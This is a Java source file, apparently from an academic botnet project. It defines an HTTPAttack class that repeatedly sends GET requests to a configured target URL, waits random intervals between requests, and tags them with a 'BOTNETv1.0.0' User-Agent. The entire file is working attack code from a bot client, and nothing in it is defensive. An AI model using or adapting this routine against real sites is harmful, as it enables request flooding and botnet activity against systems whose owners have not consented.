/**
 * The MIT License (MIT)
 *
 * Copyright (c) 2016 Giacomo Marciani, Michele Porretta
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

package com.acmutv.botnet.attacks;

import com.acmutv.botnet.config.BotConfiguration;
import com.acmutv.botnet.model.Target;
import com.acmutv.botnet.tools.RandomTools;
import lombok.Data;

import java.io.IOException;
import java.net.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Random;
import java.util.concurrent.TimeUnit;

/**
 * This class realizes the runnable performing the GET attack.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see Target
 */
@Data
public class HTTPAttack implements Runnable {
  private final Target target;
  private Random rnd = new Random();

  @Override
  public void run() {
    Target tgt = this.getTarget();
    for (long i = 0; i < tgt.getMaxAttempts(); i++) {
      try {
        this.makeGetRequest(tgt.getUrl());
      } catch (IOException e) {
        e.printStackTrace();
        return;
      }
      int seconds = RandomTools.getRandomInt(tgt.getPeriod().getMin(), tgt.getPeriod().getMax(),
          this.getRnd());
      try {
        TimeUnit.SECONDS.sleep(seconds);
      } catch (InterruptedException e) {
        e.printStackTrace();
      }
    }
  }

  private void makeGetRequest(final URL url) throws IOException {
    HttpURLConnection http = (HttpURLConnection) url.openConnection();
    http.setRequestMethod("GET");
    http.setRequestProperty("User-Agent", "BOTNETv1.0.0");
    int response = http.getResponseCode();

    boolean debug = BotConfiguration.getInstance().isDebug();
    DateTimeFormatter dtf = BotConfiguration.getInstance().getDtf();
    if (debug) {
      System.out.format("[BOT %s]> GET %s :: %d\n", dtf.format(LocalDateTime.now()), url, response);
    }
  }

}
